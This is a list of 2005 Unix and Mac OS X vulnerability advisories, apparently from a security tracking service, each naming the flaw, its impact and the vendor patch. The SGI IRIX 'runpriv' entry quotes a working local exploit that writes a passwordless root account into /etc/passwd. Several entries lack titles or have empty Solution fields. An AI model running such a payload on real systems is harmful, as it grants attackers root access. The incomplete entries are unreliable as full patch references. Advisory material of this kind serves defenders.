Title: IBM AIX Buffer Overflow in chcon Command Has Unspecified Impact
Description:
A vulnerability was reported in AIX in the chcon command.  The impact was not specified.
When DEBUG MALLOC is enabled, a local user can supply a long input argument to the chcon command to trigger a buffer overflow and cause a core dump.

No further details were provided.
Impact': The impact was not specified.
Solution:
The vendor has issued a fix (APAR IY78253 for AIX 5.2 and APAR IY78241 for AIX 5.3).

The vendor's advisories are available at:

http://www-1.ibm.com/support/docview.wss?uid=isg1IY78241
http://www-1.ibm.com/support/docview.wss?uid=isg1IY78253

Title: Sun Solaris chdir() Null Pointer Dereference Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in Sun Solaris.  A local user can cause a system panic.
A local user can trigger a null pointer dereference to cause a system panic in the '/proc' filesystem.

A specially crafted chdir() call can trigger the vulnerability.

Only Solaris 10 is affected.
Impact': A local user can cause a system panic.
Solution:
Sun has issued the following fixes.

SPARC Platform

    * Solaris 10 with patch 118822-19 or later

x86 Platform

    * Solaris 10 with patch 118844-19 or later

Title: IBM AIX lscfg Command May Let Local Users Gain Elevated Privileges
Description:
A vulnerability was reported in AIX.  A local user may be able to obtain elevated privileges.
The AIX 'lscfg' command creates temporary trace files in an unsafe manner.  A local user can create a symbolic link (symlink) from a critical file on the system to a temporary file to be used by the lscfg command.  Then, when the command is run by the target user, the symlinked file will be modified with the privileges of the target user.

This may allow the allow the user to corrupt system files or potentially obtain root privileges on the target system.
Impact': A local user can corrupt system files and may be able to gain root privileges on the target system.
Solution:
The vendor has issued a fix (APAR IY77624), described at:

http://www-1.ibm.com/support/docview.wss?uid=isg1IY77624

Title: Sun Solaris SCTP Socket Option Processing Bugs Let Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in Sun Solaris.  A local user can cause a kernel panic.
A local user can exploit several flaws in the SCTP Socket Option Processing in Solaris 10 to cause a system panic.

Solaris 8 and 9 are not affected.
Impact': A local user can cause a kernel panic.
Solution:
The vendor has issued the following fixes.

SPARC Platform

    * Solaris 10 with patch 119075-09 or later

x86 Platform

    * Solaris 10 with patch 119076-08 or later

Title: Sun Solaris pwdx Discloses Process Directory Information to Local Users
Description:
A vulnerability was reported in pwdx on Sun Solaris.  A local user can view process directory information.
A local user can exploit a vulnerability in the Solaris 10 Process File System (procfs) to view process working directories for all other system and user processes.  As a result, the user may be able to see file names in these directories.

Solaris 8 and 9 are not affected.
Impact': A local user can view process working directories for other system and user processes.
Solution:
Sun has issued the following fixes.

SPARC Platform

    * Solaris 10 with patch 118822-19 or later

X86 Platform

    * Solaris 10 with patch 118844-19 or later

Title: Sun Solaris secpolicy_fs_common() Null Pointer Dereference Lets Local Users Panic the System
Impact: Denial of service via local system
Description:
A vulnerability was reported in Sun Solaris.  A local user can cause denial of service conditions.
The Solaris 10 file system privilege management feature contains a vulnerability in the secpolicy_fs_common() function.  A local user can issue a specially crafted remount command to trigger a null pointer dereference, causing a kernel panic.

Solaris 8 and 9 are not affected.
Impact': A local user can cause a kernel panic.
Solution:
Sun has issued the following fixes.

SPARC Platform

    * Solaris 10 with patch 118822-16 or later

x86 Platform

    * Solaris 10 with patch 118844-16 or later

Title: HP-UX Itanium Stack Bug Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in HP-UX on Itanium-based systems.  A local user can cause denial of service conditions.
Under certain conditions, a local user can exploit a specific stack size that will prevent proper operations.  This can cause denial of service conditions.

Only HP9000 Servers running HP-UX release B.11.23 on Itanium are affected.

No further details were provided.
Impact': A local user can cause denial of service conditions.
Solution:
The vendor has issued patches, available at:

http://itrc.hp.com

B.11.23 - PHKL_33713 or subsequent

B.11.23 - PHKL_33714 or subsequent

Users can retrieve the applicable patches and install them using swinstall(1M).

Title: SGI IRIX 'runpriv' Input Validation Error Lets Certain Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
iDEFENSE reported a vulnerability in 'runpriv' on SGI IRIX.  A local user may be able to execute arbitrary code with root privileges.
A local user with privileges to access 'runpriv' with at least one binary in '/usr/sysadm/privbin' can invoke the 'runpriv' application and append an arbitrary command to execute the arbitrary command with elevated privileges.

A demonstration exploit [for a user with privileges to run 'mountfs'] is provided:

/usr/sysadm/bin/runpriv mountfs -s test -d / -o \|
  "ksh -c 'echo r00t::0:0:r00t:/tmp:/bin/sh >> /etc/passwd'"
su r00t -c "chown root:sys /tmp/passwd123 ;
mv /tmp/passwd123 /etc/passwd ;
chmod 644 /etc/passwd ; su" 

The vendor was notified on September 8, 2005.

The original advisory is available at:

http://www.idefense.com/application/poi/display?id=312&type=vulnerabilities
Impact': A local user with certain privileges can execute arbitrary code with root privileges.
Solution:
The vendor has issued a fix (patch 7004) for IRIX 6.5.27 and 6.5.28, available at:

http://support.sgi.com/

Title: IBM AIX getconf Utility Lets Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in IBM's AIX operating system.  A local user can gain root privileges.
A local user can exploit a buffer overflow in the getconf command to execute arbitrary code with root privileges.
Impact': A local user can execute arbitrary code with root privileges.
Solution:
The vendor has issued the following fixes:

      APAR number for AIX 5.2.0: IY73850 (available)
      APAR number for AIX 5.3.0: IY73814 (available)

AIX Version 5 APARs are available at:

http://www-1.ibm.com/servers/eserver/support/pseries/aixfixes.html

Title: Sun Solaris UFS Logging Bug in ufs_setsecattr() Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in Sun Solaris when UFS logging is enabled.  A local user can cause denial of service conditions.
A local user with 'write' access to a Unix File System (UFS) where UFS logging is enabled may be able to cause a 'soft hang' of the operating system.  Incorrect lock-ordering in the ufs_setsecattr() function may result in a deadlock.

Solaris 10 is not affected.
Impact': A local user can cause denial of service conditions.
Solution:
Sun has issued the following fixes.

SPARC Platform

    * Solaris 8 with patch 116950-05 or later
    * Solaris 9 with patch 117427-03 or later

x86 Platform

    * Solaris 8 with patch 116951-05 or later
    * Solaris 9 with patch 117476-01 or later

Title: Apple Mac OS X securityd May Let Local Users Gain Elevated Privileges
Description:
A vulnerability was reported in the Apple Mac OS X securityd.  A local user may be able to gain elevated privileges on the target system.
The securityd Authorization Services function allows a local user to grant themselves certain privileged rights, including the ability to manipulate arbitrary files.  This may allow the local user to obtain elevated privileges.
Impact': A local user may be able to gain elevated privileges on the target system.
Solution:
Apple has released a fix as part of Security Update 2005-008, available from the Software Update pane in System Preferences, or Apple's Software Downloads web site at:

http://www.apple.com/support/downloads/

For Mac OS X v10.4.2 and Mac OS X Server v10.4.2

The download file is named:  "SecUpd2005-008Pan.dmg"
Its SHA-1 digest is:  65f4dde09ee46fb9e1d58259f4085d90f420fae0

Title: Apple Mac OS X malloc() Debugging Feature Temporary Files May Let Local Users Gain Elevated Privileges
Description:
A vulnerability was reported in Apple Mac OS X.  A local user may be able to obtain elevated privileges.
The malloc() function may create diagnostic files in an unsafe manner when certain environment variables are set to enable debugging of application memory allocation.  A local user can create a symbolic link (symlink) from a critical file on the system to a temporary file to be used by the debugging function.  Then, when a privileged application is run with this debugging enabled, the symlinked file will be created or overwritten with the privileges of the target application.

As a result, a local user may be able to gain elevated privileges.

The vendor credits Ilja van Sprundel of Suresec LTD with reporting this vulnerability.
Impact': A local user may be able to obtain elevated privileges.
Solution:
Apple has released a fix as part of Security Update 2005-008, available from the Software Update pane in System Preferences, or Apple's Software Downloads web site at:

http://www.apple.com/support/downloads/

For Mac OS X v10.4.2 and Mac OS X Server v10.4.2
The download file is named:  "SecUpd2005-008Ti.dmg"
Its SHA-1 digest is:  9284ab3e3ed19761b74edb1afffba052f606c993

For Mac OS X v10.3.9 and Mac OS X Server v10.3.9
The download file is named:  "SecUpd2005-008Pan.dmg"
Its SHA-1 digest is:  65f4dde09ee46fb9e1d58259f4085d90f420fae0

Title: Apple ImageIO Buffer Overflow in Processing GIF Images Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in Apple ImageIO.  A remote user can cause arbitrary code to be executed on the target user's system.
A remote user can create a specially crafted GIF image file that, when viewed by the target user, will trigger a buffer overflow an potentially execute arbitrary code.  The code will run with the privileges of the target user.

The ImageIO component is included in WebCore and Safari.
Impact': A remote user can cause arbitrary code to be executed on the target user's system with the privileges of the target user.
Solution:
Apple has released a fix as part of Security Update 2005-008, available from the Software Update pane in System Preferences, or Apple's Software Downloads web site at:

http://www.apple.com/support/downloads/

For Mac OS X v10.4.2 and Mac OS X Server v10.4.2
The download file is named:  "SecUpd2005-008Ti.dmg"
Its SHA-1 digest is:  9284ab3e3ed19761b74edb1afffba052f606c993

Title: Sun Solaris 'tl' Driver Bug Lets Local Users Panic the System
Impact: Denial of service via local system
Description:
A vulnerability was reported in Solaris in the 'tl' driver.  A local user can cause denial of service conditions.
A local user may be able to trigger a flaw in the serializer_enter() function and cause a system panic.

Solaris 8 and 9 are not affected.
Impact': A local user can cause a system panic.
Solution:
Sun has issued the following fixes.

SPARC Platform

x86 Platform

    * Solaris 10 with patch 120665-01 or later

Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in Apple Mac OS X in servermgrd.  A remote user can execute arbitrary code.
A remote user can send specially crafted data to trigger a buffer overflow in the processing of authentication data.  Arbitrary code can be executed.
Impact': A remote user can execute arbitrary code on the target system.

Title: Apple Mac OS X Bug in servermgr_ipfilter May Prevent Certain Firewall Rules From Being Enforced
Description:
A vulnerability was reported in Apple Mac OS X in servermgr_ipfilter.  Some firewall policies may not be enforced.
The Server Admin tool may not always write firewall rules to the Active Rules when the rules contain multiple subnets and Address Groups.

Systems prior to Mac OS X 10.4 are not affected.

Apple credits Matt Richard of Franklin & Marshall College and Chris Pepper of The Rockefeller University with reporting this vulnerability.
Impact': Some firewall rules may not always be written to the Active Rules when the rules contain multiple subnets and Address Groups.
Solution:
Apple has issued a fix as part of Security Update 2005-007 v1.1, available from the Software Update pane in System Preferences or via Apple's Software Downloads web site at:

Title: Apple Mac OS X SecurityInterface May Disclose Passwords to Authenticated Administrators
Description:
A vulnerability was reported in Apple Mac OS X in the SecurityInterface component.  The system may disclose previously suggested passwords to the administrator.
When the administrator uses the password assistant while adding multiple accounts, the administrator can view previously suggested passwords.

Systems prior to Mac OS X 10.4 are not affected.

Apple credits Andrew Langmead of Boston.com with reporting this vulnerability.
Impact': The system may disclose previously suggested passwords to the administrator.
Solution:
Apple has issued a fix as part of Security Update 2005-007 v1.1, available from the Software Update pane in System Preferences or via Apple's Software Downloads web site at:

Title: Apple QuartzComposerScreenSaver Lets Physically Local Users Bypass the Password Mechanism
Description:
A vulnerability was reported in Apple Mac OS X in the QuartzComposerScreenSaver.  A local user can bypass the screen saver locking mechanism in certain cases.
A physically local user can open displayed links from the RSS Visualizer even if the screen saver is configured to require a password.

Appled credits Jay Craft of GrooVault Entertainment, LLC with reporting this vulnerability.
Impact': A local user can bypass the screen saver locking mechanism to view displayed RSS links.
Solution:

Title: Apple Mac OS X loginwindow Fast User Switching Lets Certain Local Users Access Accounts on the System
Description:
A vulnerability was reported in Apple Mac OS X in loginwindow.  A local user can gain access to other logged-in accounts on the system.
If Fast User Switching is enabled, a local user who knows the password for two accounts can access a third account without knowing the password to that third account.

Systems prior to Mac OS X 10.4 are not affected.

Apple credits Sam McCandlish with reporting this vulnerability.
Impact': A local user can access a logged-in account without the password (in certain cases).
Solution:
Apple has issued a fix as part of Security Update 2005-007 v1.1, available from the Software Update pane in System Preferences or via Apple's Software Downloads web site at:

Title: Apple Mac OS X CoreFoundation Command Line Buffer Overflow and Date Parsing Error Lets Local Users Execute Arbitrary Code and Deny Service
Impact: Denial of service via local system
Execution of arbitrary code via local system
Description:
Two vulnerabilities were reported in Apple Mac OS X CoreFoundation.  A local user can execute arbitrary code or cause denial of service conditions.
A local user can supply a specially crafted command line argument within the CoreFoundation framework to trigger a buffer overflow and execute arbitrary code [CVE-2005-2505].  Mac OS X 10.4.2 is not affected.

A local user can supply a specially crafted date value to the CoreFoundation framework to cause applications to stall while CoreFoundation attempts to parse the date [CVE-2005-2506].

Apple credits David Remahl with reporting these vulnerabilities.
Impact': A local user can execute arbitrary code or cause applications to stall.
Solution:

Title: Sun Solaris printd Lets Remote Users Delete Arbitrary Files
Impact: Denial of service via local system
Description:
A vulnerability was reported in Sun Solaris in printd.  A remote user may be able to delete arbitrary files from the target system.
A local or remote user can exploit an unspecified flaw in the 'printd' daemon to remove arbitrary files on the target system.

Only systems that have the printer package "SUNWpcu" installed are affected.
Impact': A local or remote user can delete arbitrary files on the target system.
Solution:
Sun has issued the following fixes.

SPARC Platform

    * Solaris 7 with patch 107115-19 or later
    * Solaris 8 with patch 109320-16 or later
    * Solaris 9 with patch 113329-15 or later
    * Solaris 10 with patch 120467-01 or later

x86 Platform

    * Solaris 7 with patch 107116-19 or later
    * Solaris 8 with patch 109321-16 or later
    * Solaris 9 with patch 114980-16 or later
    * Solaris 10 with patch 120468-01 or later

Title: Apple Font Book Can Be Crashed By Specially Crafted Font Collections
Description:
A vulnerability was reported in Apple Font Book.  A remote user may be able to cause a target user's application to crash.
A remote user can create a specially named collection of fonts.  When the collection is added by the target user, the Font Book application will crash on the target system.

A long string of characters can trigger the flaw.

new.security at gmail.com reported this vulnerability.
Impact': A user can create a specially crafted font "collection" that will crash the target user's Font Book application.
Solution: No solution was available at the time of this entry.

Title: FreeBSD Bug in IPSec AES-XCBC-MAC Algorithm May Cause the Incorrect Key to Be Used
Description:
A vulnerability was reported in FreeBSD in the IPSec implementation in the AES-XCBC-MAC algorithm.  The system may use the incorrect key.
The system may use a constant key instead of the key specified by the system administrator due to a programming error in the software.

If the AES-XCBC-MAC algorithm is used for authentication and no encryption is used, then a remote user can create specially crafted packets to establish an IPsec connection with the target system.

The vendor credits Yukiyo Akisada of Yokogawa Electric Corporation with reporting this vulnerability.
Impact': A remote user may be able to establish an unauthorized IPsec connection with the target system.
Solution:
The vendor has issued a fix and has provided the following solution information [quoted]:

Perform one of the following:

1) Upgrade your vulnerable system to 5-STABLE, or to the RELENG_5_4 or RELENG_5_3 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 5.3 and 5.4 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:19/ipsec.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:19/ipsec.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

As a workaround, the vendor indicates that you can not use the AES-XCBC-MAC algorithm for authentication, or use it together with some form of IPsec encryption.

Title: Sun Multilanguage Environment Library (libmle) Buffer Overflow Lets Local Users Obtain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in the Sun Multilanguage Environment Library (libmle).  A local user can obtain elevated privileges on the target system.
A local user may be able to invoke an application using the libmle library to trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the application that is dynamically linked to the libmle library.

The libmle library is shipped with the Japanese locale.
Impact': A local user can obtain the privileges of an application on the target system that uses the libmle library.
Solution:
Sun has issued the following fixes.

SPARC Platform

    * Solaris 7 with patch 111646-01 or later
    * Solaris 8 with patch 111647-01 or later

Title: (Sun Issues Fix) Sun Solaris 'ld.so' LD_AUDIT Validation Error Lets Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in Sun Solaris in 'ld.so'.  A local user may be able to gain elevated privileges.
The 'ld.so' loader does not properly validate user-supplied input in the LD_AUDIT environment variable when executing binaries with elevated privileges.  A local user can create arbitrary code and set the environment variable to point to the arbitrary code (as a dynamic library).  Then, when a set user id (setuid) or set group id (setgid) binary is invoked, the arbitrary code may be executed with elevated privileges.

Przemyslaw Frasunek reported this vulnerability.
Impact': A local user may be able to execute arbitrary code with elevated privileges.
Solution:
Sun has issued the following fixes.

This issue is addressed in the following releases:

SPARC Platform

Solaris 8 with patch 109147-37 or later 
Solaris 9 with patch 112963-22 or later 
Solaris 10 with patch 117461-04 or later 

x86 Platform

Solaris 8 with patch 109148-37 or later
Solaris 9 with patch 113986-18 or later

Title: FreeBSD devfs Access Control Bug May Let Local Users Gain Elevated Privileges
Description:
A vulnerability was reported in FreeBSD in the devfs(5) device file system.  A local user may be able to gain elevated privileges in certain cases.
The system does not properly validate the node type parameter when creating a device.  As a result, a local user running a jailed process can access hidden devfs device nodes mounted within the jail.  The device nodes are created with their normal default access permissions, which may allow the local user to obtain potentially sensitive information or gain elevated privileges on the target system.
Impact': A local user running a jailed process can access restricted resources on the target system, which may allow the user to obtain information or gain elevated privileges.
Solution:
The vendor has issued a fix and has provided the following solution information [quoted]:

Perform one of the following:

1) Upgrade your vulnerable system to 5-STABLE, or to the RELENG_5_4, or RELENG_5_3 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 5.3, and 5.4 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:17/devfs.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:17/devfs.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: HP Tru64 TCP/IP ISN and ICMP Processing Flaws Let Remote Users Deny Service
Description:
A vulnerability was reported in HP Tru64 UNIX in the TCP/IP stack.  A remote user can cause denial of service conditions.
The Tru64 TCP/IP stack implementation does not properly process certain ICMP messages and TCP Initial Sequence Numbers (ISNs).  A remote user can cause TCP connections to be reset or the throughput of TCP connections to be reduced.
Impact': A remote user can deny service to TCP connections processed by the target system.
Solution:
HP has issued the following Early Release Patch kits.

HP Tru64 UNIX 5.1B-3 ERP Kit Name: T64KIT0025925-V51BB26-ES-20050628
Kit Location:

Kit Location:

HP Tru64 UNIX 5.1A PK6 ERP Kit Name: T64KIT0025922-V51AB24-ES-20050628
Kit Location:
http://www.itrc.hp.com/service/patch/patchDetail.do?patchid=T64KIT0025922-V51AB24-ES-20050628
MD5 checksum: 7c373b35c95945651a1cfda96bf71421

HP Tru64 UNIX 4.0G PK4 ERP Kit Name: T64KIT0025920-V40GB22-ES-20050628
Kit Location:
http://www.itrc.hp.com/service/patch/patchDetail.do?patchid=T64KIT0025920-V40GB22-ES-20050628

Kit Location:

Title: Apple Mac OS X TCP/IP Processing Bug Lets Remote Users Deny Service
Description:
A vulnerability was reported in Apple Mac OS X in the processing of TCP/IP connections.  A remote user can cause denial of service conditions.
A remote user can send a specifically crafted TCP/IP packet to the target system to trigger a null pointer dereference and cause a kernel panic.

The system must be rebooted to return to normal operations.

The vendor credits Julian Y. Koh and colleagues of Northwestern University with reporting this vulnerability.
Impact': A remote user can cause a kernel panic, requiring a reboot to return the system to normal operations.
Solution:
Apple has issued a fix as part of Mac OS X 10.4.2, available using Software Update, or from Apple Downloads:

http://www.apple.com/support/downloads/

Title: NetBSD Audio Subsystem Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in NetBSD in the audio subsystem.  A local user can crash the kernel.
A local user can invoke an ioctl() system call to set the audio stream pause state to 'unpaused' while at the same time modifying the block size information to trigger a divide by zero error and cause the kernel to crash.

The clcs and emuxki drivers are affected.  Systems wtih CS4280/4281, SB Live, or SB PC 512 audio hardware may be affected.

The flaw resides in 'sys/dev/audio.c'.

The vendor credits Ignatios Souvatzis with discovering this vulnerability.
Impact': A local user can cause the kernel to crash.
Solution:
The vendor has issued a fix.

The following fixed versions are available:

NetBSD-current:		June 12, 2005
NetBSD-3.0 branch:	June 12, 2005 
NetBSD-2.0 branch:	June 13, 2005 
NetBSD-1.6 branch:	June 17, 2005

Title: FreeBSD TCP PAWS Timestamp and TCP Options Bugs Let Remote Users Deny Service
Description:
Two vulnerabilities were reported in FreeBSD in the TCP stack implementation.  A remote user can cause denial of service conditions.
The TCP Protection Against Wrapped Sequence Numbers (PAWS) timestamps option implementation allows a remote user to send a spoofed packet with a large timer value to cause the target system to interpret subsequent packets asing being too old and, as a result, discarding the packets [CVE: CVE-2005-0356].  A remote user can exploit this to cause TCP connections being processed by the target system to be reset.

A remote user can also send a specially crafted TCP packet with the SYN flag set to overwrite certain TCP options for established TCP connections [CVE: CVE-2005-2068].
Impact': A remote user can cause denial of service conditions for existing TCP connections being processed by the target system.
Solution:
The vendor has issued a fix and has provided the following instructions [quoted].

Perform one of the following:

1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_4, RELENG_5_3, RELENG_4_11, or RELENG_4_10 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.10, 4.11, 5.3, and 5.4 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

[FreeBSD 4.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:15/tcp4.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:15/tcp4.patch.asc

[FreeBSD 5.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:15/tcp.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:15/tcp.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: (Sun Describes Workaround) Sun Solaris 'ld.so' LD_AUDIT Validation Error Lets Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in Sun Solaris in 'ld.so'.  A local user may be able to gain elevated privileges.
The 'ld.so' loader does not properly validate user-supplied input in the LD_AUDIT environment variable when executing binaries with elevated privileges.  A local user can create arbitrary code and set the environment variable to point to the arbitrary code (as a dynamic library).  Then, when a set user id (setuid) or set group id (setgid) binary is invoked, the arbitrary code may be executed with elevated privileges.

Przemyslaw Frasunek reported this vulnerability.
Impact': A local user may be able to execute arbitrary code with elevated privileges.
Solution:
Sun is working on a fix.

Sun has provided the following workaround instructions for Solaris 8 and 9 [quoted]:

Customers running Solaris 8 or Solaris 9 can back out the relevant linker patch to a revision which is not affected using the patchrm(1M) command. If the patch cannot be backed out, the ld.so.1(1M) file from an earlier patch can be replaced on the system using the following steps as the root user:

1. Copy the ld.so.1 file from the patch onto the system as shown in the following example:

    # cp ./SUNWcsu/reloc/usr/lib/ld.so.1 /usr/lib/ld.so.1-patch

2. Create a directory entry (link) for the existing runtime linker to a new file using ln(1):

    # cd /usr/lib ; ln ld.so.1 ld.so.1.original

3. Create a directory entry (link) for the patched runtime linker copied earlier to the current runtime linker, again using ln(1):

    # cd /usr/lib ; ln ld.so.1-patch ld.so.1

4. For SPARC systems running in 64-bit mode, the runtime linker located in the patch at:

    ./SUNWcsxu/reloc/usr/lib/sparcv9/ld.so.1

will need to be copied to "/usr/lib/sparcv9". The above steps can then be repeated using the "/usr/lib/sparcv9" path instead of "/usr/lib".

Title: Sun Solaris 'ld.so' LD_AUDIT Validation Error Lets Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in Sun Solaris in 'ld.so'.  A local user may be able to gain elevated privileges.
The 'ld.so' loader does not properly validate user-supplied input in the LD_AUDIT environment variable when executing binaries with elevated privileges.  A local user can create arbitrary code and set the environment variable to point to the arbitrary code (as a dynamic library).  Then, when a set user id (setuid) or set group id (setgid) binary is invoked, the arbitrary code may be executed with elevated privileges.

Przemyslaw Frasunek reported this vulnerability.
Impact': A local user may be able to execute arbitrary code with elevated privileges.
Solution: No solution was available at the time of this entry.

Title: OpenBSD IPSec getsockopt() Bug Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in OpenBSD in ip_ctloutput().  A local user can cause denial of service conditions.
A local user can invoke getsockopt(2) to get ipsec(4) credentials for a socket to trigger a kernel panic.

The flaw resides in 'sys/netinet/ip_output.c' in the ip_ctloutput() function.

The vendor credits Stefan Miltchev with reporting this vulnerability.
Impact': A local user can cause a kernel panic.
Solution:
The vendor has issued the following fixes.

ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.7/common/002_getsockopt.patch
ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.6/common/017_getsockopt.patch

Title: Apple Mac OS X launchd Unsafe Temporary File Lets Local Users Gain Elevated Privileges
Description:
A vulnerability was reported in Apple Mac OS X launchd.  A local user can gain elevated privileges.
The launchd_server_init() function creates temporary files in the '/tmp' directory in an unsafe manner.  A local user can exploit a race condition to start launchd and then create a symbolic link from a critical file on the system to the socket created in temporary directory.  Then, when the function invokes a chown() call to modify the permissions of the socket, the permissions of the symlinked file will be changed to that of the local user.

Mac OS X versions prior to 10.4 are not affected.

Neil Archibald and Ilja van Sprundel of Suresec discovered this vulnerability.

The original advisory is available at:

http://www.suresec.org/advisories/adv4.pdf
Impact': A local user can gain elevated privileges.
Solution:
Apple has issued a fix as part of Security Update 2005-006, available from the Software Update pane in System Preferences, or Apple's Software Downloads web site at:

http://www.apple.com/support/downloads/

For Mac OS X v10.4.1 and Mac OS X Server v10.4.1
The download file is named:  "SecUpd2005-006Ti.dmg"
Its SHA-1 digest is:  89e432a13fc3de743b9444e2a33f3e989ceccdb4

Title: IBM AIX Buffer Overflows in invscout, paginit, diagTasksWebSM, getlvname, and swcons Commands and Multiple p Commands Let Local Users Execute Arbitrary Code
Impact: Execution of arbitrary code via local system
Description:
Several vulnerabilities were reported in IBM's AIX operating system, affecting the invscout, paginit, diagTasksWebSM, getlvname, and swcons commands and multiple "p" commands.  A local user can obtain elevated privileges.
A local user can supply specially crafted command line parameters to trigger a buffer overflow in the invscout, paginit, diagTasksWebSM, getlvname, and swcons commands and execute arbitrary code, potentially with root privileges.

A local user with system group privileges can trigger buffer overflows in the following "p" commands:

/usr/sbin/penable
/usr/sbin/pdisable
/usr/sbin/pstart
/usr/sbin/phold
/usr/sbin/pdelay
/usr/sbin/pshare

Computer Academic Underground (CAU) reported these vulnerabilities.

The original advisories are available at:

http://www.caughq.org/advisories/CAU-2005-0002.txt
http://www.caughq.org/advisories/CAU-2005-0003.txt
http://www.caughq.org/advisories/CAU-2005-0004.txt
http://www.caughq.org/advisories/CAU-2005-0005.txt
http://www.caughq.org/advisories/CAU-2005-0006.txt
http://www.caughq.org/advisories/CAU-2005-0007.txt
Impact': A local user can execute arbitrary code with root privileges.
Solution: No solution was available at the time of this entry.

Title: HP-UX Trusted Systems Grant Access to Remote Users
Version(s): B.11.00, B.11.11, B.11.22, B.11.23; only if converted to trusted systems
Description:
A vulnerability was reported in HP-UX trusted systems.  A remote user can access the system.
HP-UX systems that have been converted to trusted systems contain an unspecified vulnerability that allows a remote user to gain unauthorized access to the target system.

No details were provided.
Impact': A remote user can gain access to the target system.
Solution:
The vendor has issued the following fixes, available at:

http://itrc.hp.com

For HP-UX B.11.00  -  PHCO_29249 and PHNE_17030
For HP-UX B.11.11  -  PHCO_33215
For HP-UX B.11.23  -  PHCO_32926

For HP-UX B.11.22, action: disable remshd (OS-Core.CORE2-SHLIBS) and avoid the telnet -t option.

Title: (Apple Issues Additional Fix) Apple OS X nfs_mount() Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in the Apple OS X kernel in the nfs_mount() system call.  A local user can cause denial of service conditions.
The nfs_mount() system call does not properly validate user-supplied data.  A local user can invoke the call with specially crafted values to trigger a kernel panic.
Impact': A local user can cause a kernel panic.
Solution:
Apple has released a fix as part opf Mac OS X 10.4.1.

Mac OS X v10.4.1 may be obtained from the Software Update pane in
System Preferences, or Apple's Software Downloads web site:
http://www.apple.com/support/downloads/

For Mac OS X v10.4
The download file is named:  "MacOSXUpdate10.4.1.dmg"
Its SHA-1 digest is:  7f4e0af21fff6cb80d271ccd9278637c660b51ad

For Mac OS X Server v10.4
The download file is named:  "MacOSXSvrUpdate10.4.1.dmg"
Its SHA-1 digest is:  bf311da7dd3cc3f039ed9188412f8eaa994a4650

Title: Mac OS X Filesystem Search Access Error May Disclose Filenames to Local Users
Description:
A vulnerability was reported in Apple Mac OS X in two filesystem search system calls.  A local user may be able to determine the name of files in inaccessible directories.
Two system calls used to search filesystem objects do not properly check directory permissions.  As a result, a local user may be able to determine filenames of files in ostensibly restricted directories.

Directories without the POSIX read permission but with the POSIX execute bits set for 'group' and 'other' may be affected.

Files stored in '~/Public/Drop Box' are affected.

The vendor credits John M. Glenn of San Francisco with reporting this vulnerability.
Impact': A local user may be able to determine the name of files in restricted directories.
Solution:
Apple has released a fix as part opf Mac OS X 10.4.1.

Mac OS X v10.4.1 may be obtained from the Software Update pane in
System Preferences, or Apple's Software Downloads web site:
http://www.apple.com/support/downloads/

For Mac OS X v10.4
The download file is named:  "MacOSXUpdate10.4.1.dmg"
Its SHA-1 digest is:  7f4e0af21fff6cb80d271ccd9278637c660b51ad

For Mac OS X Server v10.4
The download file is named:  "MacOSXSvrUpdate10.4.1.dmg"
Its SHA-1 digest is:  bf311da7dd3cc3f039ed9188412f8eaa994a4650

Title: FreeBSD Hyper-Threading Technology Support May Disclose Information to Local Users
Description:
A vulnerability was reported in FreeBSD when using Hyper-Threading Technology.  A local user may be able to obtain elevated privileges.
A local user may be able to obtain potentially sensitive information.  In "many cases," this may be exploited to gain elevated privileges.

The vendor credits Colin Percival with reporting this vulnerability.
Impact': A local user may be able to obtain information, leading to privilege escalation.
Solution:
The vendor has described the following solution [quoted]:

